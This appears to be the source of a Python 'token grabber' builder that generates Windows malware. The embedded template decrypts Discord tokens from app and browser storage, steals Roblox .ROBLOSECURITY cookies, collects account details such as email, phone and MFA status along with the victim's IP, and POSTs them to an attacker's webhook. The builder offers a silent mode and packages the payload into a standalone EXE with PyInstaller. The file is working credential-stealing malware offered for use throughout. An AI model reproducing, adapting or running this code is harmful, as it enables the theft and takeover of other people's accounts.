import subprocess
import sys
import os
import time
import shutil
from colorama import *
init(autoreset=True)

title = Fore.LIGHTRED_EX + """
╶┬╴╭─╮╷╭ ╭─╴╭╮╷   ╭─╴╭─╮╭─╮╭╮ ╭╮ ╭─╴╭─╮
 │ │ │├┴╮├╴ │╰┤   │╶╮├┬╯├─┤├┴╮├┴╮├╴ ├┬╯
 ╵ ╰─╯╵ ╵╰─╴╵ ╵   ╰─╯╵╰╴╵ ╵╰─╯╰─╯╰─╴╵╰╴
 by literallytim
""" + Style.RESET_ALL

print(title)

menu = Fore.LIGHTRED_EX + """
[ 1 ] Build Token Grabber (Discord + Roblox)
[ 0 ] Exit
""" + Style.RESET_ALL

# === TEMPLATE as list of lines ===
TEMPLATE_LINES = [
'webhook = "{placeholder_webhook}" # type: ignore',
'',
'import os',
'if os.name != "nt":',
'    exit()',
'import subprocess',
'import sys',
'import json',
'import urllib.request',
'import re',
'import base64',
'import datetime',
'import sqlite3',
'from pathlib import Path',
'',
'def pip_install(modules):',
'    for module, pip_name in modules:',
'        try:',
'            __import__(module)',
'        except ImportError:',
'            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)',
'            os.execl(sys.executable, sys.executable, *sys.argv)',
'',
'pip_install([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])',
'',
'import win32crypt',
'from Crypto.Cipher import AES',
'',
'LOCAL = os.getenv("LOCALAPPDATA")',
'ROAMING = os.getenv("APPDATA")',
'PATHS = {',
'    "Discord": os.path.join(ROAMING, "discord"),',
'    "Discord Canary": os.path.join(ROAMING, "discordcanary"),',
'    "Lightcord": os.path.join(ROAMING, "Lightcord"),',
'    "Discord PTB": os.path.join(ROAMING, "discordptb"),',
'    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),',
'    "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),',
'    "Amigo": os.path.join(LOCAL, "Amigo", "User Data"),',
'    "Torch": os.path.join(LOCAL, "Torch", "User Data"),',
'    "Orbitum": os.path.join(LOCAL, "Orbitum", "User Data"),',
'    "CentBrowser": os.path.join(LOCAL, "CentBrowser", "User Data"),',
'    "Chrome SxS": os.path.join(LOCAL, "Google", "Chrome SxS", "User Data"),',
'    "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),',
'    "Epic Privacy Browser": os.path.join(LOCAL, "Epic Privacy Browser", "User Data"),',
'    "Microsoft Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data", "Default"),',
'    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"),',
'    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),',
'    "Iridium": os.path.join(LOCAL, "Iridium", "User Data", "Default"),',
'}',
'',
'def get_headers(token=None):',
'    headers = {',
'        "Content-Type": "application/json",',
'        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",',
'    }',
'    if token:',
'        headers["Authorization"] = token',
'    return headers',
'',
'def get_tokens(path):',
'    path += "\\\\Local Storage\\\\leveldb\\\\"',
'    tokens = []',
'    if not os.path.exists(path):',
'        return tokens',
'    for file in os.listdir(path):',
'        if not file.endswith(".ldb") and file.endswith(".log"):',
'            continue',
'        try:',
'            with open(f"{path}{file}", "r", errors="ignore") as f:',
'                for line in (x.strip() for x in f.readlines()):',
'                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\\$\\$''(.*)''\\$\\$.*$][^\\"]*", line):',
'                        tokens.append(values)',
'        except PermissionError:',
'            continue',
'    return tokens',
'',
'def get_key(path):',
'    scope = {"path": path, "json": json}',
'    exec("with open(path + f\"\\\\Local State\", \"r\") as file:\\n"',
'         "\\tkey = json.loads(file.read())[\'os_crypt\'][\'encrypted_key\']", scope)',
'    return scope.get("key")',
'',
'def get_ip():',
'    try:',
'        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:',
'            return json.loads(response.read().decode()).get("ip")',
'    except:',
'        return "None"',
'',
'def get_roblox_cookie():',
'    cookie = None',
'    roblox_local = os.path.join(os.getenv("LOCALAPPDATA", ""), "Roblox")',
'    if roblox_local:',
'        xml_path = os.path.join(roblox_local, "GlobalBasicSettings.xml")',
'        if os.path.isfile(xml_path):',
'            try:',
'                with open(xml_path, "r", encoding="utf-8", errors="ignore") as f:',
'                    data = f.read()',
'                match = re.search(r\'<string name="\\.ROBLOSECURITY">([^<]+)</string>\', data)',
'                if match:',
'                    cookie = match.group(1).strip()',
'                    if cookie:',
'                        return cookie',
'            except:',
'                pass',
'    browser_cookie_paths = [',
'        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),',
'        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),',
'        os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),',
'        os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),',
'        os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Cookies"),',
'    ]',
'    for cookie_path in browser_cookie_paths:',
'        if not os.path.isfile(cookie_path):',
'            continue',
'        try:',
'            conn = sqlite3.connect(cookie_path)',
'            cursor = conn.cursor()',
'            cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE \'%roblox.com%\' AND name = \'.ROBLOSECURITY\'")',
'            row = cursor.fetchone()',
'            conn.close()',
'            if row and row[1] and row[1].startswith("_|WARNING:-DO-NOT-SHARE"):',
'                cookie = row[1]',
'                if cookie:',
'                    return cookie',
'        except:',
'            continue',
'    return cookie',
'',
'def main():',
'    done = []',
'    roblox_cookie = get_roblox_cookie()',
'    for x, path in PATHS.items():',
'        if not os.path.exists(path):',
'            continue',
'        for token in get_tokens(path):',
'            token = token.replace("\\\\", "") if token.endswith("\\\\") else token',
'            try:',
'                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(get_key(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split("dQw4w9WgXcQ:")[1])[3:15]).decrypt(base64.b64decode(token.split("dQw4w9WgXcQ:")[1])[15:])[:-16].decode()',
'                if token in done:',
'                    continue',
'                done.append(token)',
'                res = urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v10/users/@me", headers=get_headers(token)))',
'                if res.getcode() != 200:',
'                    continue',
'                res_json = json.loads(res.read().decode())',
'                params = urllib.parse.urlencode({"with_counts": True})',
'                guilds_res = json.loads(urllib.request.urlopen(urllib.request.Request(f"https://discordapp.com/api/v6/users/@me/guilds?{params}", headers=get_headers(token))).read().decode())',
'                guilds = len(guilds_res)',
'                nitro_res = json.loads(urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=get_headers(token))).read().decode())',
'                has_nitro = bool(len(nitro_res) > 0)',
'                exp_date = None',
'                if has_nitro:',
'                    exp_date = datetime.datetime.strptime(nitro_res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime("%d/%m/%Y at %H:%M:%S")',
'                info = {',
'                    "username": res_json["username"],',
'                    "id": res_json["id"],',
'                    "email": res_json["email"],',
'                    "phone": res_json["phone"],',
'                    "verified": res_json["verified"],',
'                    "mfa_enabled": res_json["mfa_enabled"],',
'                    "locale": res_json.get("locale", "Unknown"),',
'                }',
'                embed_fields = [',
'                    {"name": "Username", "value": f"```{info[\'username\']}```", "inline": True},',
'                    {"name": "User ID", "value": f"```{info[\'id\']}```", "inline": True},',
'                    {"name": "Email", "value": f"```{info[\'email\']}```", "inline": True},',
'                    {"name": "Phone", "value": f"```{info[\'phone\']}```", "inline": True},',
'                    {"name": "Verified", "value": f"```{info[\'verified\']}```", "inline": True},',
'                    {"name": "MFA/2SV", "value": f"```{info[\'mfa_enabled\']}```", "inline": True},',
'                    {"name": "Nitro", "value": f"```{has_nitro}```", "inline": True},',
'                    {"name": "Nitro Expiry", "value": f"```{exp_date if has_nitro else \'None\'}```", "inline": True},',
'                    {"name": "Guilds", "value": f"```{guilds}```", "inline": True},',
'                    {"name": "IP", "value": f"```{get_ip()}```", "inline": True},',
'                    {"name": "Region", "value": f"```{info.get(\'locale\', \'Unknown\')}```", "inline": True},',
'                ]',
'                if roblox_cookie:',
'                    embed_fields.append({"name": "Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False})',
'                embed_fields.append({"name": "Token", "value": f"```{token}```", "inline": False})',
'                embed = {',
'                    "embeds": [',
'                        {',
'                            "title": "**Token grabbed!**",',
'                            "fields": embed_fields,',
'                            "thumbnail": {',
'                                "url": f"https://cdn.discordapp.com/avatars/{info[\'id\']}/{res_json[\'avatar\']}.png"',
'                            },',
'                        }',
'                    ],',
'                }',
'                urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode("utf-8"), headers=get_headers(), method="POST")).read().decode()',
'                urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode("utf-8"), headers=get_headers(), method="POST")).read().decode()',
'            except urllib.error.HTTPError or json.JSONDecodeError:',
'                continue',
'            except Exception as e:',
'                print(f"ERROR: {e}")',
'                continue',
'',
'if __name__ == "__main__":',
'    main()',
]

TEMPLATE = "\n".join(TEMPLATE_LINES)

def main():
    print(menu)
    try:
        choice = int(input(Fore.CYAN + "Choose → " + Style.RESET_ALL))
    except ValueError:
        print(Fore.RED + "Invalid input." + Style.RESET_ALL)
        return

    if choice == 1:
        file_name = input(Fore.CYAN + "What should the file be called? → " + Style.RESET_ALL)
        webhook = input(Fore.CYAN + "Enter your webhook url → " + Style.RESET_ALL)
        silent_mode = input(Fore.CYAN + "Enable silent mode? (y/n) → " + Style.RESET_ALL).strip().lower()

        if file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
            file_name = file_name.rsplit(".", 1)[0]

        if silent_mode == "y":
            file_name += ".pyw"
        else:
            file_name += ".py"

        print(Fore.LIGHTGREEN_EX + f"""
File name → {file_name}
Webhook → {webhook}
Silent mode → {silent_mode.upper()}
""" + Style.RESET_ALL)

        confirm = input(Fore.LIGHTGREEN_EX + "Confirm? (y/n) → " + Style.RESET_ALL).strip().lower()
        if confirm != "y":
            print(Fore.LIGHTRED_EX + "Aborted." + Style.RESET_ALL)
            return

        directory = os.path.dirname(os.path.abspath(__file__))
        folder_path = os.path.join(directory, "Builds")
        os.makedirs(folder_path, exist_ok=True)

        file_path = os.path.join(folder_path, file_name)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(TEMPLATE.replace("{placeholder_webhook}", webhook))

        print(Fore.LIGHTGREEN_EX + "Installing pyinstaller..." + Style.RESET_ALL)
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True)
        time.sleep(3)

        print(Fore.LIGHTGREEN_EX + "Converting to EXE..." + Style.RESET_ALL)
        original_dir = os.getcwd()
        os.chdir(folder_path)
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", file_name, "--onefile", "--clean"],
            capture_output=True, text=True
        )
        os.chdir(original_dir)

        if result.returncode != 0:
            print(Fore.RED + f"PyInstaller error: {result.stderr}" + Style.RESET_ALL)
            return

        base_name = file_name.rsplit(".", 1)[0]
        exe_name = base_name + ".exe"
        dist_path = os.path.join(folder_path, "dist")
        exe_path = os.path.join(dist_path, exe_name)

        if os.path.exists(exe_path):
            shutil.move(exe_path, os.path.join(folder_path, exe_name))
            shutil.rmtree(os.path.join(folder_path, "build"), ignore_errors=True)
            shutil.rmtree(dist_path, ignore_errors=True)
            for f in os.listdir(folder_path):
                if f.endswith(".spec"):
                    os.remove(os.path.join(folder_path, f))
            os.remove(file_path)
            print(Fore.LIGHTGREEN_EX + f"EXE built: {os.path.join(folder_path, exe_name)}" + Style.RESET_ALL)
        else:
            print(Fore.RED + "EXE not found after build." + Style.RESET_ALL)

    elif choice == 0:
        print(Fore.LIGHTRED_EX + "Exiting..." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}" + Style.RESET_ALL)
        input("Press Enter to exit.")
